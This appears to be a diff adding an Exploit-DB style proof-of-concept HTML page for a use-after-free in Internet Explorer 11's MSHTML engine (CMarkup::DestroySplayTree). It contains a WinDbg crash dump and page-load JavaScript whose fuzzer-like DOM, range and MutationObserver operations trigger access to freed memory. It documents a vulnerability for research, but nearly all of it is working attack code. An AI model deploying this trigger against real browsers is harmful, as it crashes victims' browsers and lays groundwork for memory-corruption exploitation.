@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta http-equiv="Expires" content="0" />
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+  <meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <style type="text/css">
+   body{
+        background-color:black;
+        font-color:red;
+   };
+  </style>
+  
+  <script type='text/javascript'></script> 
+  <script type="text/javascript" language="JavaScript">
+  
+    /********************************
+     *  Exploit Title: Internet Explorer 11 CMarkup::DestroySplayTree Use-After-Free
+     *  Google Dork: n/a
+     *  Date: 03.05.2017
+     *  Exploit Author: Marcin Ressel 
+     *  TT: @r_esselm
+     *  Vendor Homepage: www.microsoft.com
+     *  Software Link: n/a
+     *  Version: 11.0.9600.18638
+     *  Tested on: Windows 7
+     *  CVE : n/a
+     *  ****************************
+        (151c.10a4): Access violation - code c0000005 (first chance)
+        First chance exceptions are reported before any exception handling.
+        This exception may be expected and handled.
+        eax=00000000 ebx=0cf14bd0 ecx=70062370 edx=00000000 esi=1195cfa0 edi=11abcfa0
+        eip=706af750 esp=09a5b240 ebp=09a5b3a4 iopl=0         nv up ei pl nz na po nc
+        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+        MSHTML!`CBackgroundInfo::Property<CBackgroundImage>'::`7'::`dynamic atexit destructor for 'fieldDefaultValue''+0x15ae0c:
+        706af750 ff36            push    dword ptr [esi]      ds:002b:1195cfa0=????????
+        0:007> !heap -p -a @esi
+               address 1195cfa0 found in
+               _DPH_HEAP_ROOT @ 9f61000
+               in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                        ef4230c:         1195c000             2000
+        743990b2 verifier!AVrfDebugPageHeapFree+0x000000c2
+        76f9170c ntdll!RtlDebugFreeHeap+0x0000002f
+        76f4a863 ntdll!RtlpFreeHeap+0x0000005d
+        76ef2bd5 ntdll!RtlFreeHeap+0x00000142
+        769c14ad kernel32!HeapFree+0x00000014
+        707ad096 MSHTML!MemoryProtection::HeapFree+0x00000046
+        6ff25102 MSHTML!CMarkup::DestroySplayTree+0x00000223
+        7000ca27 MSHTML!CMarkup::UnloadContents+0x000003c3
+        702b64b9 MSHTML!CMarkup::TearDownMarkupHelper+0x000000b2
+        702b63e0 MSHTML!CMarkup::TearDownMarkup+0x00000058
+        700c55a6 MSHTML!CFrameContentHelper::TearDownFrameContent+0x00000180
+        700c5484 MSHTML!CFrameSite::Passivate+0x00000024
+        6ff15107 MSHTML!CBase::PrivateRelease+0x000000c1
+        6fefe10e MSHTML!CElement::PrivateRelease+0x0000001a
+        705517cb MSHTML!CBase::JSBind_Release+0x00000050
+        6eed3de3 jscript9!Js::CustomExternalObject::Dispose+0x00000023
+        6eed3dac jscript9!SmallFinalizableHeapBlock::DisposeObjects+0x0000011e
+        6eed4fb0 jscript9!HeapInfo::DisposeObjects+0x000000a9
+        6eed4e80 jscript9!Recycler::DisposeObjects+0x0000004a
+        6f048af0 jscript9!ThreadContext::DisposeObjects+0x00000072
+        6f11b6b6 jscript9!DListBase<CustomHeap::Page>::DListBase<CustomHeap::Page>+0x0003acdb
+        6eec259a jscript9!HeapBucketT<SmallFinalizableHeapBlock>::SnailAlloc+0x0000003e
+        6eec2609 jscript9!Recycler::AllocFinalized+0x000000ac
+        6eec318f jscript9!ScriptEngineBase::CreateTypedObjectFromScript+0x00000055
+        6eec312a jscript9!ScriptEngineBase::CreateTypedObject+0x0000006a
+        6ff28509 MSHTML!CJScript9Holder::CBaseToVar+0x00000120
+        709202cc MSHTML!CRegisteredMutationObserver::CreateTransientCopy+0x0000001b
+        7091ff2a MSHTML!CDOMNode::AppendTransientRegisteredObservers+0x000000e3
+        706af72d MSHTML!`CBackgroundInfo::Property<CBackgroundImage>'::`7'::`dynamic atexit destructor for 'fieldDefaultValue''+0x0015ade9
+        7005f500 MSHTML!CSpliceTreeEngine::RemoveSplice+0x00004af6
+        70063a2e MSHTML!CMarkup::SpliceTreeInternal+0x000000a8
+        7052ee3f MSHTML!CDoc::CutCopyMove+0x00000d93
+ * 
+ */ 
+  
+    var ref = [];
+    var doc = null;
+    var dom = null;
+    var trg = null;
+    var trg_parent = null;
+    var text_r = null;
+    var select_o = null;
+    
+    function handle() {
+    
+                try{doc.getElementsByTagName("*")[3].appendChild(document.createElement("td"));}catch(e){}
+                try{var tmp0=doc.getElementsByTagName("*")[3].removeNode(false).appendChild(document.createElement("button")).removeNode(true);rem.push(tmp0);}catch(e){}
+                try{document.body.innerHTML = "<td>1073741823<td><p><html><div><command><command><marque><td><marque><command><div><table><td><iframe>/>195936478<select><marque><rp><canvas>4278124286/><li>0/><x>4278124286/><canvas><p>/><li>/>65537<tr><command>4294967295<x><select><object>655364042322160<li>/>254<style>/></style></li><canvas><tr><th><li>65537/></li></th></tr></canvas></x>-127<html></html></tr>4042322160<div>/><marque><x>2<table>/>0</table></x></marque>52<canvas>2<li>3503345872/>65535</li></canvas>195936478<table><marque><p><table>/>1.9999999999999<style>4<style>239</style></style></table></p></marque></table>/>1094795585<html>4096<table></table></html><canvas><select></select></canvas></iframe>/>255<style><select>1024/><th>65537<canvas><p>2</p></canvas></th></select></style></div>3/>/><marque>4042322160/></marque>/>2147483646<table><marque><p><tr>/>65537/></tr></p></marque></table>1094795585/>/>65535<select><command>4096/>65537<canvas></canvas></command></select><li>255<select><table></table></select></li><tr>/><marque>1.9999999999999/>-127</marque></tr></command><table>4278124286<ol>-127<iframe><tr>1024</tr></iframe></ol></table></html><select>4294967294<marque><body>0<td><marque>1048576</marque></td></body></marque></select></td>";}catch(e){}
+                try{doc.execCommand("justifyCenter",false,"NULL");}catch(e){}
+                try{select_o.selectAllChildren(ref[1], 0);}catch(e){}
+                try{text_r.select();}catch(e){}
+                try{tree_r.setEnd(ref[0],0);}catch(e){}
+                try{select_o.selectAllChildren(doc.body);}catch(e){}
+                try{tree_r.surroundContents(ref[0]);}catch(e){}
+                try{text_r.pasteHTML("<svg viewBox=127 2147483647 255 5 xmlns=http://www.w3.org/2000/svg xmlns=about:blank><feGaussianBlur in=SourceGraphic /> </svg>");}catch(e){}
+                try{tree_r.selectNodeContents(document.body);}catch(e){}
+                try{trg_parent.innerHTML = trg.innerHTML;}catch(e){}
+                
+    }
+  
+  
+    function testcase() {
+    
+             var  e1f = document.getElementById("e1");
+				     doc = document.getElementById("t1").contentWindow.document; 
+				     
+             e = e1f.contentWindow.document.createElement("ins"); 
+				     e.cite = 'about:blank';
+				     rf = doc.body.appendChild(e); 
+				     ref.push(rf); 
+				     e = e1f.contentWindow.document.createElement("iframe");
+				     rf = doc.body.appendChild(e); 
+				     ref.push(rf); 
+             
+				     dom = doc.getElementsByTagName("*"); 
+				     trg = dom[3]; 
+             trg_parent = doc.body;
+             text_r = doc.body.createTextRange(); 
+			       tree_r = doc.createRange(); 
+		 	       tree_r.setStart(trg,0); 
+				     tree_r.setEnd(trg,0);
+             select_o = window.getSelection(); 
+    
+             var ob = new MutationObserver(handle);
+                 ob.observe(doc,{ attributes: true, childList: true, characterData: true, subtree: true }); 
+   
+           	try { 
+                trg.insertBefore(document.createElement("div"),ref[1]);    
+            } catch(e) {}
+		   
+            doc.adoptNode(trg.attributes[0]);
+		        trg.appendChild(document.createElement("animateTransform")).removeNode(false).innnerText = "&Agrave;";
+		        tmp = trg;
+  }
+  
+  </script>
+  <title>IE11  MSHTML!CMarkup::DestroySplayTree Use-After-Free</title>
+  </head>
+  <body onload='testcase();'>
+   <iframe src='about:blank' id='t1' width="100%"></iframe><iframe width="100%" src='about:blank' id='e1'></iframe>
+  </body>
+</html>
